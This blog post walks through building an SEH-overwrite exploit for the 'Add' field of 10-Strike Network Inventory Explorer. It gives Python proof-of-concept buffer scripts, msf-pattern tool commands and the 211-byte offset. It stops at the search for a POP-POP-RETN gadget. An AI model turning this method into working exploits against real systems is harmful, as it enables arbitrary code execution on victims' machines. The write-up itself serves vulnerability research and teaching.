---
layout: post
title: 10-Strike Network Inventory Explorer 'Add' Structered Exception Handling Overwrite
date: 2020-03-24 14:31:00
categories: posts
comments: false
en: true
---

# Preamble
Today i was gathering around Exploit-DB, when i found [this](https://www.exploit-db.com/exploits/44838) exploit, so i thought of searching a vulnerability in such software.

# The Bug
10-Strike Network Inventory Explorer suffers from a Structered Exception Handling (SEH) overwrite when issuing a long command within the 'Add' parameter, meaning that arbitrary code may be executed within a crafted exploit.

Initial PoC script:

```term_session
import struct

buffer = "A" * 1000
f = open ("strike.txt", "w")
f.write(buffer)
f.close()
```

Once the exploit is executed with python, it is opened and copied to clipboard with Notepad++. In order to paste the content within the vulnerable parameter, it is gone to the 'Main tab', and the 'Add' button is selected:

![](/assets/img/Findings1/0.png)

Once this is done, the contents are pasted within the 'Computer' parameter, under 'Computer Card':

![](/assets/img/Findings1/1.png)

Seconds after this is done, the SEH Chains is overwritten:

![](/assets/img/Findings1/2.png)

A pattern is generated with msf-pattern_create:

```term_session
msf-pattern_create -l 1000 
```

![](/assets/img/Findings1/3.png)

This pattern is pasted within the previous showed parameter, overwritting the SEH Chain values with the following:

![](/assets/img/Findings1/4.png)

The nSEH value is grabbed and parsed with msf-pattern_offset:

```term_session
root@kali:~# msf-pattern_offset -q 68413068 
[*] Exact match at offset 211
root@kali:~# 
```

As seen, the offset should be 211 bytes, once this is done, the PoC is updated:

```term_session
import struct

buffer = "A" * 211 + "BBBB" + "CCCC"
f = open ("strike.txt", "w")
f.write(buffer)
f.close()
```

Upon repeating the previous process, the SEH Chains values are overwritten with the desired values:

![](/assets/img/Findings1/5.png)

Good, as now it is known that control is obtained, it is now off to find a POP-POP-RETN sequence. 

In order to find one, modules without protections are listed:

![](/assets/img/Findings1/6.png)
